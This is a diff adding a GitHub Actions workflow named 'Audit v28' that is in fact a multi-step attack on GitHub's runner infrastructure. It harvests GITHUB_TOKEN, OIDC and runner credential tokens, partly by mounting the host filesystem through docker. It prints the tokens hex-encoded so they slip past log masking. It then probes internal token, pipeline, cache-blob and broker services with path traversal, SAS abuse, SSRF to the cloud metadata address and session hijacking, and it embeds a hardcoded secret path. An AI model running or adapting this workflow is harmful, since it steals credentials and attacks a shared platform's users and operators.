@@ -1,0 +1,455 @@
+name: Audit v28
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v28:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V28 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
+            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: vstoken API exploitation — TokenIssue, TokenAuth,
+      # Oidc, EnterpriseOidc, tokenoauth2
+      # v27: connectionData=200 on vstoken for ALL tokens
+      # Now hit the actual service APIs + traversal + SSRF
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - vstoken services
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== VSTOKEN SERVICES ==="
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          IDTOK=$(cat /tmp/idtok.txt)
+          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+
+          # Get OIDC tokens for different audiences
+          echo "--- OIDC tokens ---"
+          OIDC_VS=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
+          echo "OIDC_VS: ${#OIDC_VS} chars"
+
+          for TOK_NAME in RT CTOK IDTOK; do
+            eval TOK=\$$TOK_NAME
+            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
+            echo "=== TOKEN: $TOK_NAME ==="
+
+            # TokenIssue — request new tokens
+            echo "--- TokenIssue ---"
+            for EP in \
+              "/_apis/token/session/tokens" \
+              "/_apis/token/sessionTokens" \
+              "/_apis/token/session" \
+              "/_apis/token/tokens" \
+              "/_apis/token/issue" \
+              "/_apis/token/create" \
+              "/_apis/TokenIssue" \
+              "/_apis/tokens"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $TOK" "$VSBASE$EP" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  $EP = $CODE | $(echo "$BODY" | head -c 250)"
+            done
+
+            # TokenAuth — authenticate/validate tokens
+            echo "--- TokenAuth ---"
+            for EP in \
+              "/_apis/tokenauth" \
+              "/_apis/tokenauth/validate" \
+              "/_apis/token/authenticate" \
+              "/_apis/token/validate"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $TOK" "$VSBASE$EP" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  $EP = $CODE | $(echo "$BODY" | head -c 250)"
+            done
+
+            # Oidc + EnterpriseOidc — federation endpoints
+            echo "--- Oidc ---"
+            for EP in \
+              "/_apis/oidc" \
+              "/_apis/oidc/configuration" \
+              "/_apis/oidc/.well-known/openid-configuration" \
+              "/_apis/oidc/token" \
+              "/_apis/oidc/jwks" \
+              "/.well-known/openid-configuration" \
+              "/.well-known/jwks.json" \
+              "/_apis/EnterpriseOidc" \
+              "/_apis/EnterpriseOidc/token"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $TOK" "$VSBASE$EP" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  $EP = $CODE | $(echo "$BODY" | head -c 250)"
+            done
+
+            # tokenoauth2 — separate from pipelines oauth2
+            echo "--- tokenoauth2 ---"
+            for EP in \
+              "/_apis/tokenoauth2" \
+              "/_apis/tokenoauth2/token" \
+              "/_apis/oauth2/token"; do
+              # GET
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $TOK" "$VSBASE$EP" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  GET $EP = $CODE | $(echo "$BODY" | head -c 250)"
+              # POST with form
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                "$VSBASE$EP" \
+                -d "grant_type=client_credentials&client_assertion=$TOK&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  POST $EP = $CODE | $(echo "$BODY" | head -c 250)"
+            done
+            echo ""
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: SAS token abuse — use signed URL pattern to read
+      # other blobs in the same Azure storage container
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - SAS blob abuse
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SAS BLOB ABUSE ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RESULTS="https://results-receiver.actions.githubusercontent.com"
+
+          # Create a cache entry to get a fresh signed URL
+          VER=$(echo -n "v28-sas-test" | sha256sum | cut -d' ' -f1)
+          R=$(/usr/bin/curl -sS -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$RESULTS/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
+            -d "{\"key\":\"v28-sas-probe\",\"version\":\"$VER\"}")
+          UPLOAD_URL=$(echo "$R" | jq -r '.signed_upload_url // empty' 2>/dev/null)
+          echo "Upload URL: $(echo "$UPLOAD_URL" | head -c 80)..."
+
+          if [ -n "$UPLOAD_URL" ]; then
+            # Extract SAS components
+            BLOB_HOST=$(echo "$UPLOAD_URL" | grep -oP 'https://[^/]+')
+            CONTAINER=$(echo "$UPLOAD_URL" | grep -oP '/[^/]+/' | head -1 | tr -d '/')
+            BLOB_NAME=$(echo "$UPLOAD_URL" | grep -oP '/[^/?]+\?' | head -1 | tr -d '/?')
+            SAS=$(echo "$UPLOAD_URL" | grep -oP '\?.*')
+            echo "HOST=$BLOB_HOST CONTAINER=$CONTAINER BLOB=$BLOB_NAME"
+
+            # A: List blobs in container using SAS
+            echo "--- A: Container listing ---"
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              "$BLOB_HOST/$CONTAINER?restype=container&comp=list&maxresults=10${SAS}")
+            CODE=$(echo "$R" | tail -1)
+            echo "A list = $CODE | $(echo "$R" | sed '$d' | head -c 400)"
+
+            # B: Try adjacent blob names (change last digit)
+            echo "--- B: Adjacent blobs ---"
+            BLOB_BASE=$(echo "$BLOB_NAME" | sed 's/[0-9]*$//')
+            BLOB_NUM=$(echo "$BLOB_NAME" | grep -oP '[0-9]+$')
+            if [ -n "$BLOB_NUM" ]; then
+              for OFFSET in -5 -4 -3 -2 -1 1 2 3 4 5 10 100; do
+                ADJ=$((BLOB_NUM + OFFSET))
+                R=$(/usr/bin/curl -sS -o /dev/null -w "%{http_code}" --connect-timeout 2 -m 3 \
+                  "$BLOB_HOST/$CONTAINER/${BLOB_BASE}${ADJ}${SAS}" 2>/dev/null)
+                [ "$R" != "000" ] && [ "$R" != "404" ] && \
+                  echo "B ${BLOB_BASE}${ADJ} = $R"
+              done
+            fi
+
+            # C: Try reading other containers
+            echo "--- C: Other containers ---"
+            for CONT in "actions-results" "actions-artifacts" "actions-logs" "actions-cache-backup" "actions-steps"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+                "$BLOB_HOST/$CONT?restype=container&comp=list&maxresults=5${SAS}")
+              CODE=$(echo "$R" | tail -1)
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "C $CONT = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+            done
+
+            # D: Path traversal on blob name
+            echo "--- D: Blob name traversal ---"
+            for TRAV in \
+              "../" \
+              "../../" \
+              "../actions-results/" \
+              "../$CONTAINER/" \
+              "%2e%2e/" \
+              "%2e%2e%2f" \
+              "..%252f"; do
+              R=$(/usr/bin/curl -sS -o /dev/null -w "%{http_code}" --connect-timeout 2 -m 3 \
+                "$BLOB_HOST/$CONTAINER/${TRAV}test${SAS}" 2>/dev/null)
+              [ "$R" != "000" ] && echo "D $TRAV = $R"
+            done
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Cross-deployment — hit pipelinesproxcus1
+      # v27 canonical traversal revealed different deployment
+      # Also: traversal on vstoken, SSRF via each service
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Cross-deployment + SSRF
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CROSS-DEPLOYMENT + SSRF ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+
+          # A: pipelinesproxcus1 — different deployment from our pipelinesghubeus14
+          echo "--- A: pipelinesproxcus1 ---"
+          PROX="https://pipelines.actions.githubusercontent.com/serviceDeployments/pipelinesproxcus1"
+          for EP in \
+            "/_apis/connectionData" \
+            "/_apis/resourceareas" \
+            "/_apis/distributedtask/events" \
+            "/_apis/distributedtask/agents" \
+            "/_apis/distributedtask/agentpools" \
+            "/_apis/distributedtask/variablegroups" \
+            "/_apis/distributedtask/pools" \
+            "/_apis/build/builds" \
+            "/_apis/pipelines/runs" \
+            "/_apis/runner/registration" \
+            "/_apis/actions/gates" \
+            "/_apis/oauth2/token"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$PROX$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "  $EP = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+          echo ""
+
+          # B: Try our secret path on the canonical host
+          echo "--- B: Secret on canonical ---"
+          CANON="https://pipelines.actions.githubusercontent.com/$SECRET"
+          for EP in \
+            "/_apis/connectionData" \
+            "/_apis/distributedtask/plans/$(cat /tmp/plan.txt)/timelines" \
+            "/_apis/distributedtask/plans/$(cat /tmp/plan.txt)/logs" \
+            "/_apis/distributedtask/events" \
+            "/_apis/oauth2/token"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$CANON$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "  $EP = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+          echo ""
+
+          # C: SSRF — try to make vstoken call external URLs
+          echo "--- C: vstoken SSRF ---"
+          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+          # Try POST to token endpoints with URL payloads
+          for EP in "/_apis/token/session" "/_apis/tokenoauth2/token" "/_apis/oauth2/token"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+              "$VSBASE$EP" \
+              -d '{"url":"http://169.254.169.254/metadata/instance","resource":"https://management.azure.com","redirect_uri":"http://169.254.169.254/"}' 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "  POST $EP = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+          echo ""
+
+          # D: Path traversal to OTHER service deployments
+          echo "--- D: Service deployment traversal ---"
+          for DEPL in \
+            "pipelinesghubeus14" \
+            "pipelinesproxcus1" \
+            "pipelinesproxeus1" \
+            "pipelinesghubwus2" \
+            "pipelinesghubsea" \
+            "tokenghubeus21" \
+            "tokenghubwus2" \
+            "tokenghubsea"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $RT" \
+              "https://pipelines.actions.githubusercontent.com/serviceDeployments/$DEPL/_apis/connectionData")
+            CODE=$(echo "$R" | tail -1)
+            IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+            [ "$CODE" != "HTTP_000" ] && echo "  $DEPL = $CODE iid=$IID"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Broker — fix runner status for message polling
+      # v27: session created (201, sessionId), but message="invalid runner status"
+      # Need to set status before polling
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Broker exploitation
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== BROKER EXPLOITATION ==="
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          BROKER="https://broker.actions.githubusercontent.com"
+          [ -z "$CTOK" ] || [ ${#CTOK} -lt 10 ] && { echo "NO CTOK"; exit 0; }
+
+          # A: Delete old session, create fresh
+          echo "--- A: Fresh session ---"
+          /usr/bin/curl -sS -X DELETE -H "Authorization: Bearer $CTOK" "$BROKER/session" > /dev/null 2>&1
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
+            "$BROKER/session" -d '{}')
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | sed '$d')
+          echo "A create = $CODE | $(echo "$BODY" | head -c 300)"
+          SID=$(echo "$BODY" | jq -r '.sessionId // empty' 2>/dev/null)
+          echo "SessionId: $SID"
+
+          # B: Try to set runner status
+          echo "--- B: Status endpoints ---"
+          for EP in "status" "runner/status" "runners/status" "agent/status"; do
+            for STATUS in "online" "idle" "ready" "busy" "offline"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -X PUT \
+                -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
+                "$BROKER/$EP" \
+                -d "{\"status\":\"$STATUS\",\"sessionId\":\"$SID\"}" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "  PUT $EP status=$STATUS = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+          echo ""
+
+          # C: Message with session ID in header/query
+          echo "--- C: Message with session ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 8 \
+            -H "Authorization: Bearer $CTOK" \
+            -H "X-Session-Id: $SID" \
+            "$BROKER/message?sessionId=$SID")
+          CODE=$(echo "$R" | tail -1)
+          echo "C get msg sessionId = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 8 \
+            -H "Authorization: Bearer $CTOK" \
+            "$BROKER/message?status=online&lastMessageId=0")
+          CODE=$(echo "$R" | tail -1)
+          echo "C get msg status=online = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # D: Session with body
+          echo "--- D: Session with body ---"
+          /usr/bin/curl -sS -X DELETE -H "Authorization: Bearer $CTOK" "$BROKER/session" > /dev/null
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
+            "$BROKER/session" \
+            -d '{"ownerName":"v28-test","runnerStatus":"online","agentStatus":"online","status":"online"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "D session w/body = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # E: Try to get message right after creating session with status
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 8 \
+            -H "Authorization: Bearer $CTOK" \
+            "$BROKER/message?lastMessageId=0")
+          CODE=$(echo "$R" | tail -1)
+          echo "E get msg after = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # F: Try path traversal on broker
+          echo "--- F: Broker traversal ---"
+          for P in \
+            "/../session" \
+            "/../../session" \
+            "/../message" \
+            "/_internal/sessions" \
+            "/_internal/runners" \
+            "/admin" \
+            "/admin/sessions" \
+            "/debug" \
+            "/metrics"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $CTOK" "$BROKER$P")
+            CODE=$(echo "$R" | tail -1)
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "  $P = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V28 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V28 COMPLETE ==="
